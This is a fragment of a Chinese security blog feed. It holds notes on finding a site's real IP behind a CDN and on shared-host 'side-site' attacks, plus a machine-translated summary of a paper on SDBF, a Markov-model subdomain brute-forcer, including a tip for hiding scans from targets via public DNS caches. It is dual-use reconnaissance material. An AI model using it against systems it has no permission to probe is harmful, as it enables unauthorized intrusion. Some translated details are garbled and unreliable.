    <content type="html"><![CDATA[<h2 id="0x01-旁站"><a href="#0x01-旁站" class="headerlink" title="0x01 旁站"></a>0x01 旁站</h2><p>曾经有一种攻击思路叫做旁站，也就是说一个网站可能不好攻击，然后找到同一个 IP 的其他网站，如果能拿下服务器那么就相当于拿下了这个网站</p><p>这种思路其实讲的是一个虚拟服务器上可能部署了多个网站(同一个人部署的)，采用的技术是 apache 或者是 nginx 的虚拟主机技术，都将域名解析到 80 端口，然后可以根据访问来源的域名判断解析到哪个 web 目录</p><p>这种场景是不涉及到网关的，就是一个裸 ip </p><h2 id="0x02-cdn"><a href="#0x02-cdn" class="headerlink" title="0x02 cdn"></a>0x02 cdn</h2><h3 id="1-概念原理"><a href="#1-概念原理" class="headerlink" title="1.概念原理"></a>1.概念原理</h3><p>现在的大多网站都使用了 cdn 的技术，cdn 全称为内容分发网络,下面是 阿里云 cdn 的一个例子</p><p>假设您的加速域名为<a href="http://www.a.com,接入cdn网络,开始使用加速服务后,当终端用户(北京)发起http请求时,处理流程如下图所示./">www.a.com，接入CDN网络，开始使用加速服务后，当终端用户（北京）发起HTTP请求时，处理流程如下图所示。</a></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/cdn%20%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.jpg" alt="cdn原理"></p><p>所以此时的 cdn 就相当于一个网关，访问网站的时候，会先解析到一个 cname,然后这个 cname 再解析到 cdn 的 ip，这种情况下，你从不同地区查询一个网站的 ip 就会有多个结果，因为 cdn 的 cname 会去返回离你最近的 cdn ip ，<a href="https://www.17ce.com/">https://www.17ce.com/</a> 网站就能模拟多地访问，看看一个域名是不是开了 cdn</p><p>同样的道理，我们反查一个 ip 的绑定域名有哪些，可能会出现多个网站，这种情况下也可能这个 IP 就是一个 cdn 的 ip  </p><h3 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2.检测方法"></a>2.检测方法</h3><p>由此我们就引出了判断一个域名是不是开了 cdn 的方法</p><p>(1)ping 域名，然后看 cname<br>(2)通过 17ce 从多地进行测试，看网站是不是解析到不同的ip，如果是则说明开了 cdn(这个条件并不是一个决定因素，因为还有叫做智能dns和 dns 负载均衡的技术)<br>(3)ip 反查，查看 ip 上是不是很多网站绑定，如果是则说明这个是 cdn 的 ip<br>(4)查看 ip 的运营商，如果是阿里云或者腾讯云这种肯定是没有cdn 的，基本就是真实 ip</p><h2 id="0x03-智能双线-dns-解析-与-cdn"><a href="#0x03-智能双线-dns-解析-与-cdn" class="headerlink" title="0x03 智能双线 dns 解析 与 cdn"></a>0x03 智能双线 dns 解析 与 cdn</h2><p>双线双IP方式，用户在自己的服务器上接双网卡设双IP，然后电信网通两条线分别接服务器的两个网卡，这时配合智能DNS技术，可以根据用户访问来源的不同，智能地指向电信或者网通线路所对应的IP地址。其原理为用户申请一个域名，然后在域名注册商处将该域名解析地址分别设为电信与网通线路的IP地址。当用户访问该域名时，他的IE浏览器向服务器提交了一个URL地址，DNS服务器智能分析用户的线路，如果属于电信线路，就把域名的电信IP解析给用户，也同理解析网通的IP地址。</p><p><strong>CDN服务，其实就是把静态页面缓存到不同地区很多台专门的缓存服务器上，然后根据用户线路所在的地区自动选择一个最近的缓存服务器让用户访问，以此提高速度，</strong> 这种方案对静态页面效果非常好，同时它也需要智能DNS的帮助才能实现把用户引导到离自己最近的缓存服务器上。</p><p><strong>智能DNS本身并没有加速功能，说白了就是自动识别网通、电信各线路的用户，然后解析到不同的IP，起到一个引导作用。</strong> 但是由于国内各地域、各系统的网络环境各不相同，并不仅仅是简单的电信、网通两种资源，所以会有域名做了智能DNS后，其用户访问速度反而下降的情况发生。但是使用智能DNS，客户源站是动态还是静态内容则没有影响，效果一样。</p><p>CDN的优点是内容缓存并分发，根据布点的范围，基本可以解决所有ISP互通问题和网络链路问题，减轻了源站服务器的压力，同时可以具有有效抗DDOS攻击的能力，还可以节约骨干网资源，CDN目前大多是对静态内容进行加速，而对动态内容加速效果不如静态内容。另外，CDN的内容缓存和同步周期有一定的滞后，可通过手工推送或自动推送进行加速节点的内容更新。</p><p>总结一下就是 智能 dns 不是一个分发网络，而是主动识别来源 ip 然后解析到一个多 ip 服务器的对应 ip 上</p><h2 id="0x04-dns-负载均衡"><a href="#0x04-dns-负载均衡" class="headerlink" title="0x04 dns 负载均衡"></a>0x04 dns 负载均衡</h2><p>dns 本身具有负载均衡的功能，只要将一个域名配置多个 ip 地址就可以实现</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/dns%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1.jpg" alt="dns负载均衡"></p><p>由上图可以看出，在DNS服务器中应该配置了多个A记录，如：</p><p><a href="http://www.apusapp.com/">www.apusapp.com</a> IN A 114.100.20.201;<br><a href="http://www.apusapp.com/">www.apusapp.com</a> IN A 114.100.20.202;<br><a href="http://www.apusapp.com/">www.apusapp.com</a> IN A 114.100.20.203;</p><p>每次域名解析请求都会根据对应的负载均衡算法计算出一个不同的IP地址并返回，这样A记录中配置多个服务器就可以构成一个集群，并可以实现负载均衡</p><h2 id="0x04-常见的关于-dns-的问题"><a href="#0x04-常见的关于-dns-的问题" class="headerlink" title="0x04 常见的关于 dns 的问题"></a>0x04 常见的关于 dns 的问题</h2><h3 id="1-多个域名解析到一个-iP"><a href="#1-多个域名解析到一个-iP" class="headerlink" title="1.多个域名解析到一个 iP"></a>1.多个域名解析到一个 iP</h3><p><strong>一个 IP 可以绑定多个域名。</strong></p><p>（1）多个域名解析到一个网站</p><p>如您需要实现多个域名访问同一个网站，只需就不同域名添加 A 记录指向同一个 IP 即可。</p><p>（2）多个域名解析到不同网站</p><p>如您需要实现多个域名访问同一虚拟服务器上不同网站，也需要就不同域名添加 A 记录指向 IP，然后在您的主机提供商完成域名绑定设置(虚拟主机设置)，或利用主机头设置、端口号方式实现访问。</p><p>（3）cdn</p><p>这种就不是真实网站的 ip 而是 cdn 的ip，所以就可能有多个网站的 cdn 的 ip 是一样的，</p><h3 id="2-一个域名解析到多个-ip"><a href="#2-一个域名解析到多个-ip" class="headerlink" title="2.一个域名解析到多个 ip"></a>2.一个域名解析到多个 ip</h3><p>(1)子域名解析到不同 ip</p><p>如果您需要同一顶级域名的不同二级域名指向不同 IP 地址，您可以在设置域名解析时，选择需要解析的域名增<br>加多条 A 记录，不同的主机记录对应不同的 IP 地址。</p><p>(2)双线路智能解析</p><p>如果是来自不同线路的 IP 地址，只需在解析线路选择对应线路即可。</p><p>(3)dns 负载均衡</p><p>dns 解析记录可以配置多条A记录，每次域名解析请求都会根据对应的负载均衡算法计算出一个不同的IP地址并返回，这样A记录中配置多个服务器就可以构成一个集群，并可以实现负载均衡。</p><p>(4) cdn </p><p>这种情况返回的就不是真实的 ip ,而是 cdn 的 ip,因为 cdn 有负载均衡的功能，所以不同地方获取到的 cdn 的 ip 是不一样的，</p><h3 id="3-反向-dns-解析"><a href="#3-反向-dns-解析" class="headerlink" title="3.反向 dns 解析"></a>3.反向 dns 解析</h3><p>域名反向解析指从 IP 地址到域名的映射。由于在域名系统中，<strong>一个 IP 地址可以对应多个域名</strong>，因此从IP出发去找域名，理论上应该遍历整个域名树，但这在 Internet上有庞大的域名结构，遍历整个域名树无法实现。</p><p>为了完成逆向域名解析，系统提供一个特别域，该特别域称为逆向解析域。这样域解析的 <strong>IP地址就会被表达成一种像域名一样的可显示串形式</strong>，后缀以逆向解析域域名结尾。</p><p>两种表达方式中 IP地址部分顺序恰好相反，因为域名结构是自底向上（从子域到域），而 <strong>IP地址结构是自顶向下（从网络到主机）的</strong>。</p><p><strong>实质上逆向域名解析是将IP地址表达成一个域名，以地址做为索引的域名空间，这样逆向解析的很大部分可以纳入正向解析中。</strong></p><p>邮件服务器的反向域名解析功能，目的在于拒绝接收所有没有注册域名的地址发来的信息。在邮件服务器上拒绝接收来自没有域名的站点发来的信息可以大大降低垃圾邮件的数量。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://help.aliyun.com/document_detail/27112.html?spm=a2c4g.11186623.6.575.75df57507j6Sw1">https://help.aliyun.com/document_detail/27112.html?spm=a2c4g.11186623.6.575.75df57507j6Sw1</a><br><a href="https://help.aliyun.com/document_detail/122172.html?spm=a2c4g.11186623.2.21.321ce9c3dWlZq1#concept-678821">https://help.aliyun.com/document_detail/122172.html?spm=a2c4g.11186623.2.21.321ce9c3dWlZq1#concept-678821</a><br><a href="https://wenku.baidu.com/view/5a6225acb14e852459fb572d.html#">https://wenku.baidu.com/view/5a6225acb14e852459fb572d.html#</a><br><a href="http://docs-aliyun.cn-hangzhou.oss.aliyun-inc.com/pdf/alidns-faqs-cn-zh-2019-03-07.pdf">http://docs-aliyun.cn-hangzhou.oss.aliyun-inc.com/pdf/alidns-faqs-cn-zh-2019-03-07.pdf</a><br><a href="http://www.mamicode.com/info-detail-1632528.html">http://www.mamicode.com/info-detail-1632528.html</a><br><a href="https://blog.csdn.net/weibo1230123/article/details/82946179">https://blog.csdn.net/weibo1230123/article/details/82946179</a></p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SDBF:智能 DNS 爆破</title>
    <link href="/2020/08/10/SDBF:%E6%99%BA%E8%83%BD%20DNS%20%E7%88%86%E7%A0%B4/"/>
    <url>/2020/08/10/SDBF:%E6%99%BA%E8%83%BD%20DNS%20%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-摘要"><a href="#0x00-摘要" class="headerlink" title="0x00 摘要"></a>0x00 摘要</h2><p>域名的结构与提供对给定企业的管理、组织和运营的见解高度相关。对网络中的主机和服务进行安全性评估，以确定网络中的目标和服务。跟踪流行的僵尸网络使用的域名是另一个需要隐藏其底层DNS结构的主要应用程序。</p><p>目前的方法仅限于简单的暴力扫描或反向域名系统，但这些都是不可靠的。<br><strong>暴力攻击依赖于一个庞大的已知单词列表</strong>，因此，<strong>不会针对未知名称工作</strong>，而<strong>反向DNS并不总是设置或正确配置</strong>。本文讨论了快速高效地生成DNS名称的问题，并描述了针对实际大规模DNS名称的实际经验。我们的方法基于自然语言建模的技术，利用马尔可夫链模型来构建第一个DNS扫描器（SDBF），它同时利用训练和高级语言建模方法。</p><h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>DNS是指域名系统，代表一个层次化的命名系统，它将域名从人类可读的形式转换为连接到互联网上的计算机&#x2F;服务的IP地址。这不仅使DNS成为上网必不可少的工具，而且<strong>填补了作为人机接口的空白</strong>。这也使得DNS对攻击者具有吸引力。例如，DNS探测是侦察阶段的一项重要任务，攻击者在该阶段收集信息。DNS显示有关潜在目标的有价值的信息，例如基础设施信息、MX或NS记录等。这些有价值的信息可以作为攻击的攻击点，例如，在适当配置的网络中不应启用恶意区域传输，因此需要进行探测。</p><p>本文提出了一种新的域名生成方法。智能DNS Brute Forcer（SDBF）工具依赖于一种称为<strong>n-gram模型</strong>的自然语言处理方法，该方法使用<strong>Markov链</strong>来合成新的DNS名称。这些新创建的DNS名称在网络上进行<strong>验证</strong>，并通过与其他工具进行比较来评估。</p><p>论文的结构安排如下：第二节介绍了SDBF模型，介绍了SDBF模型的主要特点和模块。此外，本节还介绍了如何通过引用具有马尔可夫链的n-gram模型生成新的DNS名称。第三节讨论了实验结果，并对其性能进行了评价。第四节介绍了这一领域的相关研究工作，第五节描述了可能的未来工作并提出了结论</p><h2 id="0x02-结构"><a href="#0x02-结构" class="headerlink" title="0x02 结构"></a>0x02 结构</h2><p>SDBF工具由两个不同的模块组成，<strong>处理器和生成器</strong>。处理器生成统计信息并从被动DNS输入中提取特征。它负责生成n元概率分布（见第II-B节）。生成模块用于组成使用n元概率的新DNS名称。然后通过执行DNS探测来验证新创建的DNS名称。图1显示了SDBF的体系结构。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B41.jpg" alt="此处输入图片的描述"><br>图1：智能DNS爆破（SDBF）的体系结构</p><h3 id="1-特征和统计参数"><a href="#1-特征和统计参数" class="headerlink" title="1.特征和统计参数"></a>1.特征和统计参数</h3><p>为了使用SDBF生成新的DNS名称，已经确定了一些特性。这些特征主要是对不同语言属性的分布，例如字符分布。由本地网络运营商提供的被动DNS文件被用来提取这些特征。DNS文件有一组DNS名称N &#x3D; {n1, …, nP }一组字符C&#x3D;{c1，…，cM}，一组以给定字符开头的n个字，例如x，Gx&#x3D;{x1，…，xT}和一组域名级别L&#x3D;{l1，…，lS}，其中#L设置为4。本文用#表示集合的基数。<br>我们定义，<br><code>#wlenn</code>:具有n个单词的DNS名称的数目<br><code>#leni，j</code>:具有j个字符的第i级（i∈L）的字数<br><code>#firstchari，j</code>:以字符j∈C<br><code>#ngrami，j，k</code>：在第i层上，字符j∈C后跟字符k∈C，i∈L的次数</p><p>下表重新组合处理器提取的不同特征，</p><ul><li>DNS名称中的字数</li><li>以字符表示的级别l的单词长度分布distleni可以定义为DNS名称中级别i的域单词的长度</li><li>i级单词中出现最多的第一个字符firstchari的分布距离，</li><li>从被动DNS文件中提取n个gram的分布，称为n-gram。第II-B小节详细描述了n-gram模型。</li><li>n-gram的分布可以定义为</li></ul><p>除这些特征外，还进行了一些统计评估，以完成数据集和模型评估。这包括</p><ul><li>一个文件中DNS条目的数量，nall</li><li>以字符为单位的平均DNS名称长度，包括数字和特殊字符（即-、&#x2F;、2等）</li><li>DNS名称的每个字符、数字或特殊字符的字符频率</li></ul><h3 id="2-N-gram模型"><a href="#2-N-gram模型" class="headerlink" title="2.N-gram模型"></a>2.N-gram模型</h3><p>在自然语言处理中，n-gram<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B41.jpg">1</a>是从语料库（文本、句子等的集合）中提取的一个字符串的n个连续字符的序列，长度n&#x3D;1、2、3、4，。。。。长度为1的n元称为一元，n&#x3D;2称为二元。通过对DNS名称的首次手动调查，本文中的n-gram方法不仅考虑字母，还考虑特殊字符和数字，因为域名无法与简单的文本进行比较。为了举例说明n-gram，请考虑下面的test1.ex2ample.net</p><p>n &#x3D; 1, t, e, s, t, 1, …<br>n &#x3D; 2, te, es, st, t1, …<br>n &#x3D; 3, tes, est, st1, …</p><p>在第一步中，使用被动DNS文件作为训练，通过应用第II-a节中的公式生成n-gram频率。使用包含Markov链的n-gram模型合成新的DNS名称。参考<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B42.jpg">2</a>，<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B41.jpg">1</a>的符号，假设X&#x3D;X1，…，Xm作为一组随机变量，马尔可夫链可以定义为一组状态S&#x3D;{s1，s2，…，sr}，其中一个过程从一个给定的状态开始，连续地从一个状态移动到另一个状态或保持在同一个状态，这个移动称为step。马尔可夫链尊重马尔可夫特性1，即未来状态只依赖于当前状态（历史）。</p><p>一个状态以一定的概率变为另一个状态或以一定的概率保持在同一个状态，这也称为转移概率。这些跃迁概率取自n-gram分布。如果pij状态的概率保持在相同的状态，则概率不变。此外，关于S的初始概率分布标志着Markov链的起始状态。图2中给出了一个马尔可夫链的状态图示例。给出了从一种状态到另一种状态的n元跃迁概率。这里，“u”后跟“n”的概率为0.4，而“u”后跟字母“i”的概率为0.6。一个“i”后面跟着另一个“i”的概率是0.2。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B42.jpg" alt="此处输入图片的描述"><br>图2:n-gram 的马尔可夫链</p><h3 id="3-生成器模块"><a href="#3-生成器模块" class="headerlink" title="3.生成器模块"></a>3.生成器模块</h3><p>图3中的生成器模块负责生成新的DNS名称。在第一步中，通过触发DNS名称中字数的随机数或使用自定义字数生成域字数，请参阅图3（1）。对于每个生成的单词，字符长度由用户设置或使用distwleli随机生成，即单词级别i的单词长度分布，参见（2）。对于每个域名，第一个字符是通过使用第一个字符分布随机选择的，见（3）。以n元模型生成的Markov概率转移矩阵和生成的单词长度作为输入，应用最可能的连续n个单词（基于概率分布）生成单词。用户还可以定义DNS名称的子部分，请参见（2’）。例如，在图3中，必须创建一个3个单词的DNS名称，并且用户已经将第二个级别设置为uni。第一级自动生成为snt。通过使用上述方法之一添加第三级，然后给出完整的域名snt.uni.lu公司. 因此，用户可以很容易地探测与正则表达式（如ns.*.lu）匹配的域名。</p><p>为了使DNS名称的创建更加灵活，所有发行版都考虑了一个因素。例如，即使学习数据库不包含任何以z开头的第一级单词，也可以生成这个单词，同时引入这个小概率因子。SDBF可以并行运行，从多个位置进行探测，而不必多次探测同一DNS名称。此外，语言特性可能会被丢弃，因为参与机器可以位于不同的国家，每个国家都有自己的本地特征数据库。此外，由于可靠性的原因，大型企业网络部署了多个权威服务器。通过从多个内部位置对该服务器执行并行和迭代查询，可以发现差异，这可能表示配置错误。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B43.jpg" alt="此处输入图片的描述"><br>图3：生成器模块</p><h2 id="0x03-实验结果"><a href="#0x03-实验结果" class="headerlink" title="0x03 实验结果"></a>0x03 实验结果</h2><h3 id="1-学习数据"><a href="#1-学习数据" class="headerlink" title="1.学习数据"></a>1.学习数据</h3><p>已使用的学习数据集由本地操作员提供。此数据集描述了解析程序和权威服务器之间捕获的大约1小时的被动DNS监视活动。下表重组了学习数据集的主要特征，</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B44.jpg" alt="此处输入图片的描述"><br>表一：学习数据集的特征</p><h3 id="2-验证"><a href="#2-验证" class="headerlink" title="2.验证"></a>2.验证</h3><p>由于SDBF的目标是发现主机名，实验评估考虑 #D 已在探测域上发现的名称数。由于这些数字高度依赖于探测域，因此两个域之间的数量级可能会有很大的变化。因此，这应该表示为应该发现的实名总数的比率。实际上，获得这样的信息是不可能的</p><p>已在探测域上发现的名称数。由于这些数字高度依赖于探测域，因此两个域之间的数量级可能会有很大的变化。因此，这应该表示为应该发现的实名总数的比率。实际上，获取这些信息是不可能的。性能评估是基于与其他现有工具的比较：fire<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B43.jpg">3</a>和DNSenum<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B44.jpg">4</a>，这两个工具都包含在Backtrack<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B45.jpg">5</a>中，这是一个被安全专家广泛用于渗透测试的linux发行版。在<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B45.jpg">5</a>中，DNS探测是通过应用通用机器名字典来完成的。DNSenum包括一个266930个词条的大词典，而firefer只有1895个词条。SDBF不限制要生成的名称数量。因此，将该值设置为280000，以便具有与DNSenum相似的值，包括一个空白，以查看更多主机名的测试是否仍然有效。其他一些技术如Google，为了获取更多关于某个域中的活主机的信息而放弃。由于这些技术超出了纯DNS探测的范围，这种应用程序已经被丢弃。</p><p>SDBF验证假定每个工具发现的DNS名称的数目：#Dsdbf、#Ddnsenum和#Dfierce。<br>这也可以表示为任何工具可以发现的最大名称数的比率</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B45.jpg" alt="此处输入图片的描述"></p><p>然而，这个实验是面向虚拟主机的，在虚拟主机中，同一个主机可能匹配不同的名称。这允许一台主机在同一个端口上承载多个服务。一个标准的例子是web服务器，其中的DNS名称区分了网站和想要访问的用户（更多细节见<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B46.jpg">6</a>）。一个简单的解决方案是只考虑不同的IP地址，但这似乎过于限制，因为检测不同的服务很重要，即使它们是在同一台机器上执行的。但是，用不同的主机名探测某些域总是会返回积极的结果，而且在许多情况下是公共web服务器。<br>但这些情况并不相关，因此IP地址也被考虑在内。否则，保留域名。<br>实验集中在A请求上，但是SDBF也可以被配置成可以使用其他类型的请求</p><h3 id="3-主机名探测"><a href="#3-主机名探测" class="headerlink" title="3.主机名探测"></a>3.主机名探测</h3><p>第一组实验旨在识别给定域的所有宿主。例如，一个目标领域是大学领域，uni.lu 目标是检测与正则表达式<em>匹配的名称。</em>.uni.lu像<a href="http://www.uni.lu./">www.uni.lu。</a><br>此外，SDBF还将探测其他子域并生成如下请求<a href="http://www.snt.uni.lu,因为后面的学习数据包括最多4个单词的域名(见iii-a./">www.snt.uni.lu，因为后面的学习数据包括最多4个单词的域名（见III-A。</a></p><p>表II显示了一个探测域名的发现主机数量，检查了条目数D和速率%D。从表2中可以看出，它首先保存了一些来自卢森堡的本地域，其次是位于世界各地的域，称为world。SDBF是最有效的工具，因为它发现了最大数量的有效名称，永久性比率超过50%。假设75%的最佳结果，该比率至少为85%，尽管对于fire和DNSenum，这个值分别下降到69%和51%。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B46.jpg" alt="此处输入图片的描述"><br>表二：发现有效名称的效率（粗体表示每个域的最佳工具）</p><p>与基于本地的域相比，SDBF似乎更适合在全球范围内进行探测，即使它是使用本地DNS捕获进行训练的。这可能是因为世界域名已经从Alexa网站的排名靠前的网站中提取出来<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B47.jpg">7</a>，这导致了对后台有许多主机的著名大型域名的调查，而卢森堡的本地域名规模较小，主机较少。像使用SDBF一样，生成各种DNS名称是高效的。</p><h3 id="4-发现速度"><a href="#4-发现速度" class="headerlink" title="4.发现速度"></a>4.发现速度</h3><p>SDBF可以生成无限多个新的DNS名称来进行探测，因此，与普通的基于字典的工具相比，SDBF有更大的机会发现更多的主机。被探测的进程的数量被定义为有效的进程名。可从该工具得出的单个速率值</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B47.jpg" alt="此处输入图片的描述"><br>其中，符号#（x）是集合x的基数</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B48.jpg" alt="此处输入图片的描述"><br>图4（a）和图4（b）绘制了该指标，其中计算了卢森堡和全球所有探测域的平均值。Fierce很快就能找到宿主，但由于它的字典很小（1895个主机名），它可能会漏掉不太常见的名字。其他工具的发现速度较低，但匹配的名称更多。比较DNSenum和SDBF，后者总是更快，除了在曲线末端DNSenum更好。事实上，字典是按字母顺序（通常是这样）使用的，DNSenum曲线中的斜率变化意味着有效名称存在于接近字母的位置。例如，上一次坡度变化主要是由于以下名称www、www2、web等。</p><h3 id="5-工具互补性"><a href="#5-工具互补性" class="headerlink" title="5.工具互补性"></a>5.工具互补性</h3><p>在前面的实验中，评估是基于成功探测到的DNS名称的数量。然而，有时用一个精心设计的词典可以达到很好的效果。但是，这可能导致只探测常见名称，如web、ftp或邮件服务器。SDBF超出了这一限制，可以看作是一种补充工具。因此，下一个实验通过计算其他工具没有看到的成功探测名称的数量来评估互补性。根据之前定义的面额，定义了三组，</p><ul><li>Ssdbf :SDBF发现的名称</li><li>Sdnsenum: DNSenum发现的名字</li><li>Sfierce:  Fierce发现的名字</li></ul><p>图5是一个示例。工具的唯一性度量可以定义为成功探测的名称数与生成的名称总数之间的比率。该度量由图中的灰色阴影区域表示，并且对于每个工具t∈t&#x3D;{sdbf，dnsenum，f ierce}正式定义为：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B49.jpg" alt="此处输入图片的描述"></p><p>为了加强验证，通过计算以下指标来考虑SDBF与其他工具的互补性（见图5）：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B410.jpg" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B411.jpg" alt="此处输入图片的描述"><br>图5：工具的互补性-阴影区域表示工具的唯一性度量，虚线和粗线分别界定了SDBF与DNSenum和fire的互补性</p><p>为了集中精力评估SDBF，t总是固定为SDBF，如等式3所示。</p><p>图6全面总结了结果。<br>x轴表示按uniqt降序排序的域，但表示为索引，因为每个工具的顺序可能不同。因此，第一个索引可能不代表同一个域，但这里的目标不是通过计算发现的唯一性来比较每个域的工具。从总体上看，这两种工具具有相似的性能，但SDBF具有较高的平均比率（0.69）而稍有优势。因为索引已经排序</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B412.jpg" alt="此处输入图片的描述"><br>图6：发现的有效名称的唯一性-索引表示按uniqt排序的域</p><p>图6用一条垂直线显示了第50和第75个百分位。因此，在SDBF中75%的uniqsdbf值（0.67）高于fire（0.52）和DNSEnum（0.54）。这意味着SDBF能够探索各种DNS名称，而这些名称还没有被其他工具发现。简言之，所有测试工具都是非常互补的。</p><p>图7显示了SDBF针对每个工具（uniqsdbf，y）发现的值的唯一性。与DNSenum相比，SDBF发现的DNS名称似乎更为独特。然而，这种小偏差主要是由于词典非常小。此外，情况并非总是如此，尤其是rtl.lu公司以及脸谱网其中uniqsdbf，fierce相当于uniqsdbf，dnsenum。这样的例子证明，即使是SDBF也使用随机过程来生成域名，而学习阶段对于生成新的有效名称是相当有效的，就像那些已经被输入到专家词典中的域名一样</p><p>综上所述，SDBF能够发现更多的DNS名称，而其中大多数不是通过基于字典的方法发现的。这就证明了SDBF的成本是合理的，即使需要生成许多请求。例如，实验需要生成28万个名字，不像“fierce”被限制为1895个名字。</p><p>因此，必须在要发现的名称和要过滤的风险之间进行正确的权衡，因为从网络的角度来看，SDBF非常嘈杂。为了避免这个问题，可以像II-C中提到的那样，在多台机器上分布扫描，但是另一种选择是使用缓存服务器。通过利用迭代查询，SDBF可以直接探测非权威服务器的缓存，从而将自己隐藏在目标域之外。为了提高效率，这种方法必须查询高负载的服务器，比如Google的公共DNS<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B48.jpg">8</a>。</p><h3 id="6-域名探测"><a href="#6-域名探测" class="headerlink" title="6.域名探测"></a>6.域名探测</h3><p>基于字典的常用工具被设计用来探测一个域的所有主机名，就像之前的实验一样。<br>例如，它们可以生成与常规表达式类似*.uni.lu. SDBF能够匹配像ns.<em>.lu（在.lu域中查找名称服务器）这样的表达式，因为它单独处理每个单词，用户可以设置名称结构。下面是域</em>的无效探测域名的一些示例 *.pt.lu公司都给了。 </p><p>gbnsy.1bl.pt.lu<br>sa174fz7246fof35to.du.pt.lu<br>nes.pt.lu</p><p>有效域名的一些示例是，</p><p><a href="http://www.pt.lu/">www.pt.lu</a><br>roma.pt.lu<br>mmail.pt.lu</p><p>在另一个实验中，对卢森堡的FTP<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B49.jpg">9</a>和域名服务器进行了探索。这与以下表达式匹配：ns.<em>.lu和ftp.</em>.lu。即使这个实验没有包括所有可能存在的名称，最后还是发现了30个名称服务器和706个FTP服务器</p><h2 id="0x04-相关工作"><a href="#0x04-相关工作" class="headerlink" title="0x04 相关工作"></a>0x04 相关工作</h2><p>在DNS分析的研究领域，论文主要可以分为两大类：调查和实现解决方案的论文。与此研究领域相关的第一类论文是已进行的调查，如<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B410.jpg">10</a>、<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B411.jpg">11</a>。这些描述了可能的攻击方案，如可疑端口号、群发邮件、垃圾邮件、快速流量等，以及相应的对策。第二类论文应用了统计评估的方法或提出了重新设计域名系统的新方法<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%99%BA%E8%83%BDDNS%E7%88%86%E7%A0%B412.jpg">12</a>，但只有少数论文涉及域名知识[13]，[14]。</p><p>例如，在文章[15]中，作者希望检测各种快速中毒攻击，这些攻击通过对事务组件的不同盲离路径猜测方法操纵解析缓存，这些方法用于DNS消息完整性。在这种攻击中，客户端被重定向到有害站点的新的不同IP地址。为了对抗这种攻击，在[15]中，它被称为具有白名单和不同类型分类器的统计评估，如k-最近邻或支持向量机来检测RR数据中的异常。在[16]中，作者描述了在本地网络上部署大学监控工具并监控网络活动。[16] 